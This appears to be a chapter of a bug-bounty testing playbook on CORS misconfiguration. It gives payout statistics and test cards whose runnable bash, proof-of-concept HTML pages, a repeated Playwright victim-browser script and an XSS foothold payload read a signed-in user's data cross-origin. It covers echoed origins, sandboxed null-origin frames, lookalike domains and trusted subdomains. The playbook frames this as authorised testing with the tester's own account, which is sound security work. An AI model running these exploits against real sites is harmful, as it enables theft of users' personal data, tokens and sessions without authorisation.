# COR · CORS misconfiguration

> The application tells browsers that a page on another origin may read its responses with the visitor's
> cookies, and that origin is one an attacker can occupy. It pays when that page reads something of the signed-in
> victim's (personal data, a token, an API key) or makes a change no form could; a header with nothing private
> behind it is informative, and current browsers stop many textbook cases before the server is asked.

| | |
|---|---|
| **Class** | `cors` |
| **Applies when** | http, cors-headers |
| **Pays** | 61 disclosed reports (11 more touch the class), 5 paid, median $500, top $550. The paid ones read a signed-in user's details or support tickets from an attacker's page, or trusted any browser-extension origin; a header with no data read behind it is closed informative. |
| **Weaknesses** | Origin Validation Error · CWE-346 · CWE-942 (permissive cross-domain policy) · Cross-Site Request Forgery (CSRF) · CWE-352 · Cache Poisoning · CWE-349 |

## Why it pays

CORS is paid for what the attacker's page reads or does, never for the header. Of the 61 disclosed reports filed
under the class (11 more touch it), 5 were paid, median $500, top $550. The paid ones read the signed-in user's data
from an attacker's page (#426165, $550, sensitive information on the main site; #317391, $500, e-mail addresses and
ids from a support gateway; #1001951, $257, support tickets on an ads portal), or trusted any browser-extension
origin, which let an extension impersonate the user (#412490, $500); the fifth is #1478449 ($50). Two more paid
reports are cross-origin writes: a site-wide CSRF that worked in Safari through the CORS policy (#975983, $300) and
an over-broad policy plus GraphQL over GET that let a page act as another user (#998457, $300, filed as CSRF).
Reports whose read returned a token or a password are titled as account takeover or token theft (#426147, rated
high; #685032; #688567) and carry no recorded bounty. Most of the rest are unpaid: nine come from the U.S. Dept Of
Defense alone, and closures for reading nothing private are common (#879582's summary: the user's IP address and
"no impact"; #1113759: public information on an out-of-scope site). Many programmes exclude CORS without
demonstrated data theft outright (`cors`). Titles rarely name the mechanism, so the prior art on each card is the
closest match by title and summary.

Browsers decide what can still be proven. A page on another site gets the victim's cookie on its `fetch` only when
the cookie is `SameSite=None; Secure` and the browser sends third-party cookies: Chromium treats a cookie without the
attribute as `Lax` (since 2020), Firefox partitions third-party cookies and Safari blocks them. A cross-site read
therefore works today in Chrome and Edge, for `None` cookies. A page on a sibling subdomain is same-site: its
requests carry `Lax` and `Strict` cookies in every engine, so a policy that trusts every subdomain, plus script on
one sibling (COR-004), is now the most dependable form of the class. The ceiling is a read that returns a
credential (COR-006): that is account takeover and is rated as one.

## The crux question

**Which response holding something of B's will the target hand to a page on an origin I can occupy, and will B's
browser attach B's session to that page's request?**

## Applicability probe

Settle `cors-headers` and `cookie-auth` for the asset. The fingerprinter looks only at `/`, once without an Origin
and once with one foreign Origin, and never sets `cors-headers` false: an API that answers only the origins it
lists, or only on its API paths, stays unknown until this probe runs.

```bash
source "$E/env.sh"; D="$E/evidence/$H/COR-probe"; mkdir -p "$D"; C="$D/B-cookie.headers"; grep -i '^cookie:' "$E/accounts/B.headers" > "$C"
R=$(printf '%s' "$H" | awk -F. '{print $(NF-1)"."$NF}')     # the registrable domain; set it by hand for co.uk-style suffixes
# 1. the GET paths mapped on this host, including requests the front end sends here that were saved under its own folder
{ ls "$E/recon/$H/requests/"*.http; grep -l -s -F "$H" "$E"/recon/*/requests/*.http; } 2>/dev/null | sort -u |
  xargs -r awk 'FNR==1 && $1=="GET" {print $2}' | sed -E 's#^https?://[^/]+##' | sort -u > "$D/paths.txt"; wc -l < "$D/paths.txt"
# 2. each path with B's cookie alone and four Origins: foreign, null, an invented sibling, and the asset's own
while read -r p; do for o in "https://cor-probe.example" null "https://cor-probe.$R" "$T"; do
  printf '%s | %-26s | ' "$p" "$o"; curl -sS "${HDR[@]}" -H @"$C" -H "Origin: $o" -D- -o /dev/null "$T$p" | tr -d '\r' |
    grep -i -E '^access-control-allow-(origin|credentials)' | paste -sd ' ' -; sleep 1; done; done < "$D/paths.txt" | tee "$D/acao.txt"
# 3. stacks that answer CORS only on the preflight
curl -sS "${HDR[@]}" -X OPTIONS -H 'Origin: https://cor-probe.example' -H 'Access-Control-Request-Method: PUT' \
  -H 'Access-Control-Request-Headers: content-type' -D- -o /dev/null "$T$(head -1 "$D/paths.txt")" | tr -d '\r' | grep -i '^access-control'
# 4. the origins that legitimately call this host: front-end hosts whose bundles name it
grep -rl -s -F "$H" "$E"/recon/*/js/ | sed -E "s#^$E/recon/([^/]+)/.*#\1#" | sort | uniq -c | sort -rn
# 5. the session rides in a cookie: an authenticated read with the cookie alone, then with nothing
P=$(grep -m1 -E 'me|account|user|profile|settings' "$D/paths.txt"); for h in "$C" /dev/null; do
  curl -sS "${HDR[@]}" -H @"$h" -o /dev/null -w "$h: %{http_code}\n" "$T$P"; sleep 1; done
```

```bash
scripts/sane fact set "$H" cors-headers=1 --ev "/api/v1/me answers Origin: https://cor-probe.example with itself and Access-Control-Allow-Credentials: true (COR-probe/acao.txt)"
scripts/sane fact set "$H" cookie-auth=1 --ev "the cookie alone authenticates /api/v1/me (200); no cookie 401"
# no Access-Control-* header for any of the four Origins on any mapped path, nor on the preflight:
scripts/sane fact set "$H" cors-headers=0 --ev "41 mapped GET paths x foreign, null, sibling and own Origin, plus an OPTIONS preflight: no Access-Control-* header (COR-probe/acao.txt)"
```

With `cors-headers` false the chapter closes for the asset; the planner writes the reason. Browser-managed HTTP
authentication and client certificates also ride credentialed cross-origin requests, but no fact covers them: note
such an asset in `notes.md` for the operator.

Then record once, in `notes.md`, the observation that decides which cards can end in a browser proof: B's cookies
with their real attributes, saved from one sign-in in the scriptable browser.

```bash
[ -s "$E/accounts/B.state.json" ] || npx --yes playwright open --save-storage="$E/accounts/B.state.json" "$T/"   # sign in as B, close the window
jq -r '.cookies[] | [.domain, .name, .sameSite, "secure=\(.secure)"] | @tsv' "$E/accounts/B.state.json"
```

B's session cookie at `None` with `secure=true`: a page on any site can carry it (COR-001, COR-002, COR-003,
COR-005, COR-006, COR-007). `Lax`, `Strict` or no attribute: only a page on a sibling subdomain can (COR-004). The
attacker in this class is an origin, not an account: every card needs only B, our own victim account; A is used
only to publish the page when a customer-hosted page is the foothold (COR-004).

## Triage order

COR-001 (any Origin echoed with credentials) → COR-002 (`null`, the same loop) → COR-003 (allow-list matching
flaws) → COR-005 (listed origins anyone can obtain) → COR-006 (a token or key in a readable response) → COR-007
(preflight approved: cross-origin writes) → COR-004 (every subdomain trusted: needs a foothold) → COR-009 (Origin
left out of a shared cache key) → COR-008 (local services: only where the programme ships one).

## Items

### COR-001 · An authenticated endpoint echoes any Origin with `Access-Control-Allow-Credentials: true`, so a page on another site reads B's data with B's cookie

| | |
|---|---|
| **Severity** | Medium standalone for B's personal data read by a page on another site; High with COR-006 (a token, key or reset link in a readable response) |
| **Requires** | cookie-auth, account, browser |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Origin Validation Error · CWE-346, CWE-942 |
| **Prior art** | #426165, #317391, #924951 |

- **Where:** cookie-authenticated GET endpoints that return B's data, most sensitive first: the account or profile
  API (`/api/me`, `/api/v1/user`), settings, billing and invoices, messages, notifications, API-key and integration
  listings, a GraphQL `viewer` query sent as GET. They are the GET requests saved while mapping, under this host's
  folder or under the front end's when the front end calls this host. The policy is usually one middleware for the
  whole host, so the first endpoint that echoes shows the rule; aim the proof at the most sensitive one.
- **Test:** a browser hands a credentialed cross-origin response to a page only when the response names that page's
  exact origin in `Access-Control-Allow-Origin` and carries `Access-Control-Allow-Credentials: true`. Send B's
  cookie alone (a page on another site cannot add B's `Authorization` header) with an Origin no allow-list holds.
  Then check that the browser attaches the cookie at all: a cross-site `fetch` carries it only when it is
  `SameSite=None; Secure`, and only in engines that send third-party cookies (Chrome and Edge do; Firefox
  partitions them and Safari blocks them).
- **How:**
  ```bash
  source "$E/env.sh"; D="$E/evidence/$H/COR-001"; mkdir -p "$D"; C="$D/B-cookie.headers"; grep -i '^cookie:' "$E/accounts/B.headers" > "$C"
  O="https://cor001-$RANDOM.example"           # an origin nobody's allow-list holds
  # 1. every GET mapped on this host (also those saved under the front end's folder), with B's cookie alone and the foreign Origin
  { ls "$E/recon/$H/requests/"*.http; grep -l -s -F "$H" "$E"/recon/*/requests/*.http; } 2>/dev/null | sort -u |
    xargs -r awk 'FNR==1 && $1=="GET" {print $2}' | sed -E 's#^https?://[^/]+##' | sort -u > "$D/paths.txt"
  while read -r p; do printf '%s  ' "$p"; curl -sS "${HDR[@]}" -H @"$C" -H "Origin: $O" -D- -o /dev/null -w '%{http_code}\n' "$T$p" |
    tr -d '\r' | grep -i -E '^access-control-allow-(origin|credentials)|^[0-9]{3}$' | paste -sd ' ' -; sleep 1; done < "$D/paths.txt" | tee "$D/echo.txt"
  grep -i "allow-origin: $O" "$D/echo.txt" | grep -i 'allow-credentials: true'
  # 2. B's cookies with their real attributes: the session cookie must read None and secure=true
  [ -s "$E/accounts/B.state.json" ] || npx --yes playwright open --save-storage="$E/accounts/B.state.json" "$T/"   # sign in as B, close the window
  jq -r '.cookies[] | [.domain, .name, .sameSite, "secure=\(.secure)"] | @tsv' "$E/accounts/B.state.json"
  # 3. the page, served as $O and opened in B's browser
  U="$T/api/v1/me"                             # the most sensitive endpoint from step 1
  cat > "$D/poc.html" <<EOF
  <!doctype html><meta charset="utf-8"><title>COR-001</title><pre id="o">reading $U</pre>
  <script>fetch("$U", {credentials: "include"}).then(r => r.text())
    .then(t => { document.getElementById("o").textContent = location.origin + " read " + t.length + " bytes of $U:\n" + t.slice(0, 3000); })
    .catch(e => { document.getElementById("o").textContent = "blocked: " + e; });</script>
  EOF
  # victim browser: the same helper in every COR card, written once per engagement (Playwright for Node)
  mkdir -p "$E/tools"; [ -s "$E/tools/c.pem" ] || openssl req -x509 -newkey rsa:2048 -nodes -days 30 -subj /CN=cor-poc \
    -keyout "$E/tools/k.pem" -out "$E/tools/c.pem" 2>/dev/null
  [ -s "$E/tools/cor-poc.js" ] || cat > "$E/tools/cor-poc.js" <<'JS'
  // cor-poc.js <URL B's browser opens> <page file served at that URL, or - to open the real URL> <evidence dir> <the HDR arguments>
  // B's session: $E/accounts/B.state.json, the cookies with their real SameSite, Secure and Domain. A page file is served
  // by a local HTTPS server that Chromium reaches through --host-resolver-rules, so the page has exactly the URL's origin
  // and the target receives a real cross-origin request. No page.route(): while interception is on, Playwright answers
  // CORS preflights itself. Only HDR's User-Agent is applied: a header the tool adds to the page's requests can force a
  // preflight that a real victim's browser never sends. Writes read.txt (the page text), log.txt and poc.png.
  const { chromium } = require('playwright'), https = require('https'), fs = require('fs');
  (async () => {
    const [url, file, dir, ...h] = process.argv.slice(2), u = new URL(url), E = process.env.E, st = `${E}/accounts/B.state.json`;
    let srv, args = [];
    if (file !== '-') {
      const page = fs.readFileSync(file);
      srv = https.createServer({ key: fs.readFileSync(`${E}/tools/k.pem`), cert: fs.readFileSync(`${E}/tools/c.pem`) },
        (q, r) => { r.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' }); r.end(page); }).listen(0, '127.0.0.1');
      await new Promise(r => srv.on('listening', r)); args = [`--host-resolver-rules=MAP ${u.hostname} 127.0.0.1:${srv.address().port}`];
    }
    const b = await chromium.launch({ args }), log = [`chromium ${b.version()}`], ua = h.includes('-A') ? h[h.indexOf('-A') + 1] : undefined;
    const c = await b.newContext({ storageState: fs.existsSync(st) ? st : undefined, ignoreHTTPSErrors: true, userAgent: ua }), p = await c.newPage();
    p.on('response', async s => { try { const q = s.request(); if (new URL(q.url()).origin === u.origin) return;
      const qh = await q.allHeaders(), sh = await s.allHeaders(), ck = (qh.cookie || '').split(/; */).filter(Boolean).map(x => x.split('=')[0]);
      log.push(`${q.method()} ${q.url()} ${s.status()} origin=${qh.origin || '-'} cookies=${ck.join(',') || '-'} acao=${sh['access-control-allow-origin'] || '-'} acac=${sh['access-control-allow-credentials'] || '-'}`); } catch (e) {} });
    p.on('requestfailed', q => log.push(`${q.method()} ${q.url()} failed: ${q.failure().errorText}`));
    await p.goto(url).catch(e => log.push(String(e))); await p.waitForTimeout(6000);
    fs.writeFileSync(`${dir}/read.txt`, await p.innerText('body').catch(() => '')); fs.writeFileSync(`${dir}/log.txt`, log.join('\n') + '\n');
    await p.screenshot({ path: `${dir}/poc.png`, fullPage: true }); console.log(log.join('\n')); await b.close(); if (srv) srv.close();
  })();
  JS
  NODE_PATH="$(npm root -g)" node "$E/tools/cor-poc.js" "$O/poc.html" "$D/poc.html" "$D" "${HDR[@]}"; cat "$D/read.txt"
  ```
- **Proof:** `read.txt` and `poc.png`: the page on `$O` showing B's data (our account's id and e-mail; any secret cut
  to its first and last four characters); the `log.txt` line for the request with `origin=$O`, B's session cookie
  among `cookies=`, `acao=$O` and `acac=true`, and the browser version on its first line; the curl exchange from
  step 1.
- **Not a finding when:** the response holds nothing private: public content, configuration, feature flags, a
  logged-out page, the requester's own IP address (`cors`). The endpoint returns B's data only when curl also sends
  B's `Authorization` header: the bearer token lives in the front end's storage and no browser attaches it for
  another site; the cookie-only exchange of step 1 is the one that counts. `Access-Control-Allow-Origin: *` with
  credentials: the browser refuses it. The echo without `Access-Control-Allow-Credentials: true`: an anonymous read
  only. B's session cookie is `Lax`, `Strict` or has no attribute (`cookies=-` or no session name in the log, and the
  page shows the logged-out response): no page on another site gets B's data; park it for COR-004, whose same-site
  footholds carry those cookies.
- **Escalate:** COR-006 when any readable response holds a token, key, CSRF token or reset link; COR-007 when the
  same policy also approves preflights; a GraphQL endpoint under this policy makes every query a cross-site read.
  File one report for the host: the rule is global.

### COR-002 · The policy answers `Origin: null` with `null` and credentials, so a sandboxed frame on any site reads B's data

| | |
|---|---|
| **Severity** | Medium standalone, rated like COR-001 by what the frame reads; High with COR-006 |
| **Requires** | cookie-auth, account, browser |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Origin Validation Error · CWE-346, CWE-942 |
| **Prior art** | #1404986, #1188471 |

- **Where:** the cookie-authenticated GET endpoints of this host, above all where COR-001's foreign origin is
  refused: an allow-list that also names `null` to serve local files, sandboxed widgets or embedded previews. A
  policy that echoes every origin also echoes `null`; that is one report, under COR-001.
- **Test:** browsers send `Origin: null` from a frame sandboxed without `allow-same-origin`, from `data:` and
  `file:` documents and after a cross-origin redirect, and any page on any site can create such a frame. When the
  answer to `Origin: null` carries `Access-Control-Allow-Origin: null` and `Access-Control-Allow-Credentials: true`,
  the frame reads the response with B's cookie, provided the cookie rides a cross-site request at all
  (`SameSite=None; Secure`, in an engine that sends third-party cookies).
- **How:**
  ```bash
  source "$E/env.sh"; D="$E/evidence/$H/COR-002"; mkdir -p "$D"; C="$D/B-cookie.headers"; grep -i '^cookie:' "$E/accounts/B.headers" > "$C"
  # 1. every GET mapped on this host, with B's cookie alone and Origin: null
  { ls "$E/recon/$H/requests/"*.http; grep -l -s -F "$H" "$E"/recon/*/requests/*.http; } 2>/dev/null | sort -u |
    xargs -r awk 'FNR==1 && $1=="GET" {print $2}' | sed -E 's#^https?://[^/]+##' | sort -u > "$D/paths.txt"
  while read -r p; do printf '%s  ' "$p"; curl -sS "${HDR[@]}" -H @"$C" -H 'Origin: null' -D- -o /dev/null "$T$p" | tr -d '\r' |
    grep -i -E '^access-control-allow-(origin|credentials)' | paste -sd ' ' -; sleep 1; done < "$D/paths.txt" | tee "$D/null.txt"
  # 2. B's cookies with their real attributes: a frame inside another site's page carries only None, secure ones
  [ -s "$E/accounts/B.state.json" ] || npx --yes playwright open --save-storage="$E/accounts/B.state.json" "$T/"   # sign in as B, close the window
  jq -r '.cookies[] | [.domain, .name, .sameSite, "secure=\(.secure)"] | @tsv' "$E/accounts/B.state.json"
  # 3. the page: a sandboxed frame (origin null) reads the endpoint and hands the text to its parent
  U="$T/api/v1/me"                             # an endpoint from step 1; inside srcdoc write any & in it as &amp;
  cat > "$D/poc.html" <<EOF
  <!doctype html><meta charset="utf-8"><title>COR-002</title><pre id="o">waiting for the sandboxed frame</pre>
  <iframe sandbox="allow-scripts" style="display:none" srcdoc="<script>fetch('$U', {credentials: 'include'}).then(r => r.text()).then(t => parent.postMessage(t, '*')).catch(e => parent.postMessage('blocked: ' + e, '*'));</script>"></iframe>
  <script>addEventListener("message", e => { document.getElementById("o").textContent = "frame with Origin: null read:\n" + String(e.data).slice(0, 3000); });</script>
  EOF
  # victim browser: the same helper in every COR card, written once per engagement (Playwright for Node)
  mkdir -p "$E/tools"; [ -s "$E/tools/c.pem" ] || openssl req -x509 -newkey rsa:2048 -nodes -days 30 -subj /CN=cor-poc \
    -keyout "$E/tools/k.pem" -out "$E/tools/c.pem" 2>/dev/null
  [ -s "$E/tools/cor-poc.js" ] || cat > "$E/tools/cor-poc.js" <<'JS'
  // cor-poc.js <URL B's browser opens> <page file served at that URL, or - to open the real URL> <evidence dir> <the HDR arguments>
  // B's session: $E/accounts/B.state.json, the cookies with their real SameSite, Secure and Domain. A page file is served
  // by a local HTTPS server that Chromium reaches through --host-resolver-rules, so the page has exactly the URL's origin
  // and the target receives a real cross-origin request. No page.route(): while interception is on, Playwright answers
  // CORS preflights itself. Only HDR's User-Agent is applied: a header the tool adds to the page's requests can force a
  // preflight that a real victim's browser never sends. Writes read.txt (the page text), log.txt and poc.png.
  const { chromium } = require('playwright'), https = require('https'), fs = require('fs');
  (async () => {
    const [url, file, dir, ...h] = process.argv.slice(2), u = new URL(url), E = process.env.E, st = `${E}/accounts/B.state.json`;
    let srv, args = [];
    if (file !== '-') {
      const page = fs.readFileSync(file);
      srv = https.createServer({ key: fs.readFileSync(`${E}/tools/k.pem`), cert: fs.readFileSync(`${E}/tools/c.pem`) },
        (q, r) => { r.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' }); r.end(page); }).listen(0, '127.0.0.1');
      await new Promise(r => srv.on('listening', r)); args = [`--host-resolver-rules=MAP ${u.hostname} 127.0.0.1:${srv.address().port}`];
    }
    const b = await chromium.launch({ args }), log = [`chromium ${b.version()}`], ua = h.includes('-A') ? h[h.indexOf('-A') + 1] : undefined;
    const c = await b.newContext({ storageState: fs.existsSync(st) ? st : undefined, ignoreHTTPSErrors: true, userAgent: ua }), p = await c.newPage();
    p.on('response', async s => { try { const q = s.request(); if (new URL(q.url()).origin === u.origin) return;
      const qh = await q.allHeaders(), sh = await s.allHeaders(), ck = (qh.cookie || '').split(/; */).filter(Boolean).map(x => x.split('=')[0]);
      log.push(`${q.method()} ${q.url()} ${s.status()} origin=${qh.origin || '-'} cookies=${ck.join(',') || '-'} acao=${sh['access-control-allow-origin'] || '-'} acac=${sh['access-control-allow-credentials'] || '-'}`); } catch (e) {} });
    p.on('requestfailed', q => log.push(`${q.method()} ${q.url()} failed: ${q.failure().errorText}`));
    await p.goto(url).catch(e => log.push(String(e))); await p.waitForTimeout(6000);
    fs.writeFileSync(`${dir}/read.txt`, await p.innerText('body').catch(() => '')); fs.writeFileSync(`${dir}/log.txt`, log.join('\n') + '\n');
    await p.screenshot({ path: `${dir}/poc.png`, fullPage: true }); console.log(log.join('\n')); await b.close(); if (srv) srv.close();
  })();
  JS
  NODE_PATH="$(npm root -g)" node "$E/tools/cor-poc.js" "https://cor002-$RANDOM.example/poc.html" "$D/poc.html" "$D" "${HDR[@]}"; cat "$D/read.txt"
  ```
- **Proof:** `read.txt` and `poc.png` with B's data as the outer page received it from the frame; the `log.txt`
  line with `origin=null`, B's session cookie among `cookies=`, `acao=null` and `acac=true`; the curl exchange from
  step 1 next to COR-001's refusal of a foreign origin.
- **Not a finding when:** `Access-Control-Allow-Origin: null` without `Access-Control-Allow-Credentials: true`: the
  frame reads only what needs no session. The data is not private (`cors`). B's session cookie is `Lax`, `Strict` or
  has no attribute: a frame inside another site's page never carries it. The answer is `null` only because the
  server echoes whatever arrives: report COR-001 once instead.
- **Escalate:** COR-006 through the same frame (put that card's script in the `srcdoc`); COR-007 with the preflight
  sent as `Origin: null`.

### COR-003 · The origin check matches a prefix, a suffix or an unescaped pattern, so a host name anyone can register that contains the trusted name is answered with credentials

| | |
|---|---|
| **Severity** | Medium standalone, rated like COR-001 by what the page reads; High with COR-006 |
| **Requires** | cookie-auth, account, browser |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Origin Validation Error · CWE-346 |
| **Prior art** | #1001951, #430249, #768151 |

- **Where:** endpoints where COR-001's foreign origin is refused but the legitimate front end's origin is answered
  with itself and credentials: an allow-list exists and code compares strings. The legitimate origins are the
  front-end hosts whose bundles call this host (applicability probe, step 4).
- **Test:** hand-written checks use `startsWith`, `endsWith`, `contains`, or a regular expression with an unescaped
  dot or a missing anchor, and each fails on a name anyone can register: `app.example.com.attacker.tld` (prefix or
  contains, no end anchor), `attackerexample.com` (a suffix check without the dot in front), `appxexample.com` (the
  dot of `app.example.com` left unescaped), `app.example.com_.attacker.tld` (a check that lets anything but a
  letter, digit, dot or hyphen follow the name, meant for a port). Only names a browser puts in an `Origin` count:
  Chrome and Firefox accept `_` and `-` in host names; a backtick, a brace or a space is curl-only.
- **How:**
  ```bash
  source "$E/env.sh"; D="$E/evidence/$H/COR-003"; mkdir -p "$D"; C="$D/B-cookie.headers"; grep -i '^cookie:' "$E/accounts/B.headers" > "$C"
  R=$(printf '%s' "$H" | awk -F. '{print $(NF-1)"."$NF}')     # the registrable domain; set it by hand for co.uk-style suffixes
  F="app.$R"                                                  # a front-end host this API answers (applicability probe, step 4)
  U="$T/api/v1/me"
  # 1. control rows first (the legitimate origin, a foreign one), then names that keep the trusted string
  for o in "https://$F" "https://cor003.example" "https://$F.cor003.example" "https://$R.cor003.example" "https://cor003$R" \
           "https://cor003-$R" "https://${F/./x}" "https://${F}_.cor003.example" "https://$F-cor003.example" "https://cor003.$F"; do
    printf '%-44s ' "$o"; curl -sS "${HDR[@]}" -H @"$C" -H "Origin: $o" -D- -o /dev/null "$U" | tr -d '\r' |
      grep -i -E '^access-control-allow-(origin|credentials)' | paste -sd ' ' -; sleep 1; done | tee "$D/variants.txt"
  # 2. a suffix or dot form must be a name anyone can still register: look it up, do not buy it
  for n in "cor003$R" "${F/./x}"; do printf '%s: ' "$n"; whois "$n" | grep -i -m1 -E 'no match|not found|no data|no entries|domain name:'; done
  # 3. the page, served as the accepted name and opened in B's browser
  O="https://$F.cor003.example"                               # the first attacker name answered with itself and credentials in step 1
  [ -s "$E/accounts/B.state.json" ] || npx --yes playwright open --save-storage="$E/accounts/B.state.json" "$T/"   # sign in as B, close the window
  jq -r '.cookies[] | [.domain, .name, .sameSite, "secure=\(.secure)"] | @tsv' "$E/accounts/B.state.json"
  cat > "$D/poc.html" <<EOF
  <!doctype html><meta charset="utf-8"><title>COR-003</title><pre id="o">reading $U</pre>
  <script>fetch("$U", {credentials: "include"}).then(r => r.text())
    .then(t => { document.getElementById("o").textContent = location.origin + " read " + t.length + " bytes of $U:\n" + t.slice(0, 3000); })
    .catch(e => { document.getElementById("o").textContent = "blocked: " + e; });</script>
  EOF
  # victim browser: the same helper in every COR card, written once per engagement (Playwright for Node)
  mkdir -p "$E/tools"; [ -s "$E/tools/c.pem" ] || openssl req -x509 -newkey rsa:2048 -nodes -days 30 -subj /CN=cor-poc \
    -keyout "$E/tools/k.pem" -out "$E/tools/c.pem" 2>/dev/null
  [ -s "$E/tools/cor-poc.js" ] || cat > "$E/tools/cor-poc.js" <<'JS'
  // cor-poc.js <URL B's browser opens> <page file served at that URL, or - to open the real URL> <evidence dir> <the HDR arguments>
  // B's session: $E/accounts/B.state.json, the cookies with their real SameSite, Secure and Domain. A page file is served
  // by a local HTTPS server that Chromium reaches through --host-resolver-rules, so the page has exactly the URL's origin
  // and the target receives a real cross-origin request. No page.route(): while interception is on, Playwright answers
  // CORS preflights itself. Only HDR's User-Agent is applied: a header the tool adds to the page's requests can force a
  // preflight that a real victim's browser never sends. Writes read.txt (the page text), log.txt and poc.png.
  const { chromium } = require('playwright'), https = require('https'), fs = require('fs');
  (async () => {
    const [url, file, dir, ...h] = process.argv.slice(2), u = new URL(url), E = process.env.E, st = `${E}/accounts/B.state.json`;
    let srv, args = [];
    if (file !== '-') {
      const page = fs.readFileSync(file);
      srv = https.createServer({ key: fs.readFileSync(`${E}/tools/k.pem`), cert: fs.readFileSync(`${E}/tools/c.pem`) },
        (q, r) => { r.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' }); r.end(page); }).listen(0, '127.0.0.1');
      await new Promise(r => srv.on('listening', r)); args = [`--host-resolver-rules=MAP ${u.hostname} 127.0.0.1:${srv.address().port}`];
    }
    const b = await chromium.launch({ args }), log = [`chromium ${b.version()}`], ua = h.includes('-A') ? h[h.indexOf('-A') + 1] : undefined;
    const c = await b.newContext({ storageState: fs.existsSync(st) ? st : undefined, ignoreHTTPSErrors: true, userAgent: ua }), p = await c.newPage();
    p.on('response', async s => { try { const q = s.request(); if (new URL(q.url()).origin === u.origin) return;
      const qh = await q.allHeaders(), sh = await s.allHeaders(), ck = (qh.cookie || '').split(/; */).filter(Boolean).map(x => x.split('=')[0]);
      log.push(`${q.method()} ${q.url()} ${s.status()} origin=${qh.origin || '-'} cookies=${ck.join(',') || '-'} acao=${sh['access-control-allow-origin'] || '-'} acac=${sh['access-control-allow-credentials'] || '-'}`); } catch (e) {} });
    p.on('requestfailed', q => log.push(`${q.method()} ${q.url()} failed: ${q.failure().errorText}`));
    await p.goto(url).catch(e => log.push(String(e))); await p.waitForTimeout(6000);
    fs.writeFileSync(`${dir}/read.txt`, await p.innerText('body').catch(() => '')); fs.writeFileSync(`${dir}/log.txt`, log.join('\n') + '\n');
    await p.screenshot({ path: `${dir}/poc.png`, fullPage: true }); console.log(log.join('\n')); await b.close(); if (srv) srv.close();
  })();
  JS
  NODE_PATH="$(npm root -g)" node "$E/tools/cor-poc.js" "$O/poc.html" "$D/poc.html" "$D" "${HDR[@]}"; cat "$D/read.txt"
  ```
- **Proof:** `variants.txt` with the three rows that matter: the legitimate origin answered, the plain foreign
  origin refused, the attacker name answered with itself and `Access-Control-Allow-Credentials: true`; for a name
  that must be registered (the suffix and dot forms), the `whois` answer showing it is free (it was not bought);
  then the browser run as in COR-001: `read.txt`, `poc.png`, and `log.txt` with `origin=` the attacker name.
- **Not a finding when:** the accepted name lies inside the company's own namespace (`cor003.app.example.com`): no
  outsider obtains it without a foothold, which is COR-004. The only accepted form holds a character no browser
  sends. The server echoes every origin: one report, under COR-001. B's cookie does not ride a cross-site request
  (`cookies=-` in the log): park the variant for COR-004. A registered lookalike is no reason to stop: a suffix
  check accepts any `<label>example.com`, so pick a free one.
- **Escalate:** COR-006 and COR-007 with the accepted name. The same comparison may also guard the front end's
  postMessage or WebSocket origin checks (CSD and WSS chapters).

### COR-004 · The policy trusts every subdomain of the parent domain, and script we run on one sibling reads B's data in every browser whatever B's SameSite attribute

| | |
|---|---|
| **Severity** | None standalone (trust in every subdomain is a primitive); High with script on a trusted sibling that reads B's data: an XSS, a claimed host, a page users may publish |
| **Requires** | cookie-auth, account, browser |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Origin Validation Error · CWE-346, CWE-942 |
| **Prior art** | #751699, #1255676, #1215053 |

- **Where:** hosts whose policy answers an invented sibling (`https://<random>.<parent domain>`) with itself and
  credentials. Footholds, in the order they usually turn up: an XSS on any in-scope sibling (XSS cards), a sibling
  that can be claimed (STO-003 to STO-005, `takeover-ok`), a sibling where users or customers publish HTML or
  script (storefronts, help-centre themes, user pages, uploads served inline from `files.` or `usercontent.`), and
  staging or legacy siblings that are easier to break. With customer-hosted pages, A publishes the page and B opens
  it.
- **Test:** two halves. The trust: an invented sibling, a deep one and the bare parent domain are answered with
  themselves and `Access-Control-Allow-Credentials: true`. The foothold: our script running in one such origin. A
  request from `https://<sibling>.<parent>` to this host is cross-origin but same-site, so it carries B's `Lax` and
  `Strict` cookies and escapes third-party cookie blocking in every engine. Chromium counts an `http://` sibling as
  another site: a plain-HTTP foothold carries none of them.
- **How:**
  ```bash
  source "$E/env.sh"; D="$E/evidence/$H/COR-004"; mkdir -p "$D/sim" "$D/foothold"; C="$D/B-cookie.headers"; grep -i '^cookie:' "$E/accounts/B.headers" > "$C"
  R=$(printf '%s' "$H" | awk -F. '{print $(NF-1)"."$NF}')     # the registrable domain; set it by hand for co.uk-style suffixes
  U="$T/api/v1/me"                                            # the most sensitive cookie-authenticated read from the map
  # 1. the trust: an invented sibling, a deep one, the bare parent, and a sibling over plain HTTP
  for o in "https://cor004-$RANDOM.$R" "https://a.b.cor004.$R" "https://$R" "http://cor004.$R"; do
    printf '%-36s ' "$o"; curl -sS "${HDR[@]}" -H @"$C" -H "Origin: $o" -D- -o /dev/null "$U" | tr -d '\r' |
      grep -i -E '^access-control-allow-(origin|credentials)' | paste -sd ' ' -; sleep 1; done | tee "$D/trust.txt"
  # 2. footholds: XSS and takeover results on siblings so far, and siblings where users publish content
  scripts/sane plan --csv > /dev/null; awk -F, -v r=".$R" 'index($1, r) && $2 ~ /^(XSS|STO)-/ && $4 ~ /candidate|finding|parked/' "$E/plan.csv"
  scripts/sane asset list | grep -F ".$R" | grep -i -E 'files|cdn|static|usercontent|upload|pages|sites|shop|store|help|support|docs|forum|community|blog|staging|dev|beta'
  # 3. the script for the foothold: the XSS payload, or the body of a page at an unguessable path on a claimed host
  cat > "$D/payload.js" <<EOF
  fetch("$U", {credentials: "include"}).then(r => r.text()).then(t => { document.body.innerText = location.origin + " read: " + t.slice(0, 3000); });
  EOF
  printf '<!doctype html><meta charset="utf-8"><title>COR-004</title><script>%s</script>\n' "$(cat "$D/payload.js")" > "$D/sim.html"
  # 4. B's browser: first an invented sibling served locally (a simulation: it shows what the trust gives; park the card with it),
  #    then the real foothold URL that delivers payload.js, written by hand into foothold.url
  [ -s "$E/accounts/B.state.json" ] || npx --yes playwright open --save-storage="$E/accounts/B.state.json" "$T/"   # sign in as B, close the window
  # victim browser: the same helper in every COR card, written once per engagement (Playwright for Node)
